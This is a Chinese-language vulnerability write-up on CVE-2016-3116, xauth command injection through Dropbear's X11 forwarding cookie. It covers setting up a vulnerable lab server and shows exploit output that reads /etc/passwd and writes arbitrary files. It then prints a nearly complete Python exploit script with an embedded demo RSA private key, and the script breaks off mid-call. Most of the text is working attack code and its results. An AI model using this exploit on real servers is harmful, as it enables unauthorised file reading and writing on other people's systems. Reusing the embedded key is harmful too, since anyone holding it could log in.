## 漏洞简述
Dropbear是一个相对较小的SSH服务器和客户端。开源，在无线路由器等嵌入式linux系统中使用较多。
X11是一个用于图形显示的协议，用于满足在命令行使用的情况下对图形界面的需求。开启X11服务，需要在`ssh`配置中需要开启`X11Forwarding`选项（本选项在`dropbear`中默认开启）。
本漏洞的成功触发需要认证权限，并且要求服务器`dropbear`配置中`X11Forwarding
yes`开启。漏洞产生的原因是因为没有对用户输入做足够的检查，导致用户在`cookie`中可以输入换行符，进而可以注入`xauth`命令，通过精心构造特殊的数据包，攻击者可以在一定限制下，读写任意文件泄漏关键信息或者对其它主机进行探测。
漏洞影响的版本：)下载`dropbear-2015.71.tar.bz2`,解压后执行以下命令：
    $ cd dropbear-2015.71
    $ ./configure --prefix=/usr/local/dropbear/ --sysconfdir=/etc/dropbear/
    $ make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp"
    $ sudo make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp" install
另外还需要创建一个用来存储`dropbear`配置文件的目录：
    $ mkdir /etc/dropbear
然后启动`dropbear`即可(`X11 forward`默认开启)：
    $ sudo ./dropbear -R -F -E -p 2222
在客户端主机中尝试使用`ssh`连接,可以连接成果，则表明编译成功。
### 运行exp结果
在服务器`2222`端口开启`dropbear`，尝试运行`exp`:
    $ python CVE-2016-3116_exp.py 192.168.5.171 2222 island passwd
成功连接后可以获取路径信息以及任意文件读写操作：
信息读取：
    #> .info
    DEBUG:__main__:auth_cookie: '\ninfo'
    DEBUG:__main__:dummy exec returned: None
    INFO:__main__:Authority file:       /home/island/.Xauthority
    File new:             no
    File locked:          no
    Number of entries:    2
    Changes honored:      yes
    Changes made:         no
    Current input:        (stdin):2
    /usr/bin/xauth: (stdin):1:  bad "add" command line
任意文件读：
    #> .readfile /etc/passwd
    DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
    DEBUG:__main__:dummy exec returned: None
    INFO:__main__:root:x:0:0:root:/root:/bin/zsh
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
任意文件写：
    #> .writefile /tmp/testfile1 `thisisatestfile`
    DEBUG:__main__:auth_cookie: '\nadd 127.0.0.250:65500 `thisisatestfile` aa'
    DEBUG:__main__:dummy exec returned: None
    DEBUG:__main__:auth_cookie: '\nextract /tmp/testfile1 127.0.0.250:65500'
    DEBUG:__main__:dummy exec returned: None
    DEBUG:__main__:/usr/bin/xauth: (stdin):1:  bad "add" command line
在`linux`中查看：
    $ cat /tmp/testfile1
    6550testtest65500`thisisatestfile`65500sssss%
可以看出写入成功
此处附上`exp`:
    #!/usr/bin/env python
    # -*- coding: UTF-8 -*-    # Author : 
    ###############################################################################
    #
    # FOR DEMONSTRATION PURPOSES ONLY!
    #
    ###############################################################################
    import logging
    import StringIO
    import sys
    import os
    LOGGER = logging.getLogger(__name__)
    try:
        import paramiko
    except ImportError, ie:
        logging.exception(ie)
        logging.warning("Please install python-paramiko: pip install paramiko / easy_install paramiko /  install python-paramiko")
        sys.exit(1)
    class SSHX11fwdExploit(object):
        def __init__(self, hostname, username, password, port=22, timeout=0.5, 
                     pkey=None, pkey_pass=None):
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if pkey:
                pkey = paramiko.RSAKey.from_private_key(StringIO.StringIO(pkey),pkey_pass)
            self.ssh.connect(hostname=hostname, port=port, 
                             username=username, password=password, 
                             timeout=timeout, banner_timeout=timeout,
                             look_for_keys=False, pkey=pkey)
        def exploit(self, cmd="xxxx\n?\nsource /etc/passwd\n"):
            transport = self.ssh.get_transport()
            session = transport.open_session()
            LOGGER.debug("auth_cookie: %s"%repr(cmd))
            session.request_x11(auth_cookie=cmd)
            LOGGER.debug("dummy exec returned: %s"%session.exec_command(""))
            transport.accept(0.5)
            session.recv_exit_status()  # block until exit code is ready
            stdout, stderr = [],[]
            while session.recv_ready():
                stdout.append(session.recv(4096))
            while session.recv_stderr_ready():
                stderr.append(session.recv_stderr(4096))
            session.close()
            return ''.join(stdout)+''.join(stderr)              # catch stdout, stderr
        def exploit_fwd_readfile(self, path):
            data = self.exploit("xxxx\nsource %s\n"%path)
            if "unable to open file" in data:
                raise IOError(data)
            ret = []
            for line in data.split('\n'):
                st = line.split('unknown command "',1)
                if len(st)==2:
                    ret.append(st[1].strip(' "'))
            return '\n'.join(ret)
        def exploit_fwd_write_(self, path, data):
            '''
            adds display with protocolname containing userdata. badchars=
            '''
            dummy_dispname = "127.0.0.250:65500"
            ret = self.exploit('\nadd %s %s aa'%(dummy_dispname, data))
            if ret.count('bad "add" command line')>1:
                raise Exception("could not store data most likely due to bad chars (no spaces, quotes): %s"%repr(data))
            LOGGER.debug(self.exploit('\nextract %s %s'%(path,dummy_dispname)))
            return path
    demo_authorized_keys = '''#PUBKEY line - force commands: only allow "whoami"
    #cat /home/user/.ssh/authorized_keys
    command="whoami" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1RpYKrvPkIzvAYfX/ZeU1UzLuCVWBgJUeN/wFRmj4XKl0Pr31I+7ToJnd7S9JTHkrGVDu+BToK0f2dCWLnegzLbblr9FQYSif9rHNW3BOkydUuqc8sRSf3M9oKPDCmD8GuGvn40dzdub+78seYqsSDoiPJaywTXp7G6EDcb9N55341o3MpHeNUuuZeiFz12nnuNgE8tknk1KiOx3bsuN1aer8+iTHC+RA6s4+SFOd77sZG2xTrydblr32MxJvhumCqxSwhjQgiwpzWd/NTGie9xeaH5EBIh98sLMDQ51DIntSs+FMvDx1U4rZ73OwliU5hQDobeufOr2w2ap7td15 user@box
    '''    
    PRIVKEY = """-----BEGIN RSA PRIVATE KEY-----    MIIEowIBAAKCAQEAtUaWCq7z5CM7wGH1/2XlNVMy7glVgYCVHjf8BUZo+FypdD69
    9SPu06CZ3e0vSUx5KxlQ7vgU6CtH9nQli53oMy225a/RUGEon/axzVtwTpMnVLqn
    PLEUn9zPaCjwwpg/Brhr5+NHc3bm/u/LHmKrEg6IjyWssE16exuhA3G/Teed+NaN
    zKR3jVLrmXohc9dp57jYBPLZJ5NSojsd27LjdWnq/PokxwvkQOrOPkhTne+7GRts
    U68nW5a99jMSb4bpgqsUsIY0IIsKc1nfzUxonvcXmh+RASIffLCzA0OdQyJ7UrPh
    TLw8dVOK2e9zsJYlOYUA6G3rnzq9sNmqe7XdeQIDAQABAoIBAHu5M4sTIc8h5RRH
    SBkKuMgOgwJISJ3c3uoDF/WZuudYhyeZ8xivb7/tK1d3HQEQOtsZqk2P8OUNNU6W
    s1F5cxQLLXvS5i/QQGP9ghlBQYO/l+aShrY7vnHlyYGz/68xLkMt+CgKzaeXDc4O
    aDnS6iOm27mn4xdpqiEAGIM7TXCjcPSQ4l8YPxaj84rHBcD4w033Sdzc7i73UUne
    euQL7bBz5xNibOIFPY3h4q6fbw4bJtPBzAB8c7/qYhJ5P3czGxtqhSqQRogK8T6T
    A7fGezF90krTGOAz5zJGV+F7+q0L9pIR+uOg+OBFBBmgM5sKRNl8pyrBq/957JaA
    rhSB0QECgYEA1604IXr4CzAa7tKj+FqNdNJI6jEfp99EE8OIHUExTs57SaouSjhe
    DDpBRSTX96+EpRnUSbJFnXZn1S9cZfT8i80kSoM1xvHgjwMNqhBTo+sYWVQrfBmj
    bDVVbTozREaMQezgHl+Tn6G1OuDz5nEnu+7gm1Ud07BFLqi8Ssbhu2kCgYEA1yrc
    KPIAIVPZfALngqT6fpX6P7zHWdOO/Uw+PoDCJtI2qljpXHXrcI4ZlOjBp1fcpBC9
    2Q0TNUfra8m3LGbWfqM23gTaqLmVSZSmcM8OVuKuJ38wcMcNG+7DevGYuELXbOgY
    nimhjY+3+SXFWIHAtkJKAwZbPO7p857nMcbBH5ECgYBnCdx9MlB6l9rmKkAoEKrw
    Gt629A0ZmHLftlS7FUBHVCJWiTVgRBm6YcJ5FCcRsAsBDZv8MW1M0xq8IMpV83sM
    F0+1QYZZq4kLCfxnOTGcaF7TnoC/40fOFJThgCKqBcJQZKiWGjde1lTM8lfTyk+f
    W3p2+20qi1Yh+n8qgmWpsQKBgQCESNF6Su5Rjx+S4qY65/spgEOOlB1r2Gl8yTcr
    bjXvcCYzrN4r/kN1u6d2qXMF0zrPk4tkumkoxMK0ThvTrJYK3YWKEinsucxSpJV/
    nY0PVeYEWmoJrBcfKTf9ijN+dXnEdx1LgATW55kQEGy38W3tn+uo2GuXlrs3EGbL
    b4qkQQKBgF2XUv9umKYiwwhBPneEhTplQgDcVpWdxkO4sZdzww+y4SHifxVRzNmX
    Ao8bTPte9nDf+PhgPiWIktaBARZVM2C2yrKHETDqCfme5WQKzC8c9vSf91DSJ4aV
    pryt5Ae9gUOCx+d7W2EU7RIn9p6YDopZSeDuU395nxisfyR1bjlv
    -----END RSA PRIVATE KEY-----"""
    if __name__=="__main__":
        logging.basicConfig(loglevel=logging.DEBUG)
        LOGGER.setLevel(logging.DEBUG)
        if not len(sys.argv)>4:
            print """ Usage:    
            path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
    """
            sys.exit(1)
        hostname, port, username, password = sys.argv[1:]
        port = int(port)
        pkey = None
        if os.path.isfile(password):
            password = None
            with open(password,'r') as f:
                pkey = f.read()
        elif password==".demoprivkey":
            pkey = PRIVKEY
            password = None
            LOGGER.info("add this line to your authorized_keys file: \n%s"%demo_authorized_keys)
        LOGGER.info("connecting to: %s:%s@%s:%s"%(username,password if not pkey else "", hostname, port))
        ex = SSHX11fwdExploit(hostname, port=port,
                              username=username, password=password,
                              pkey=pkey,
                              timeout=10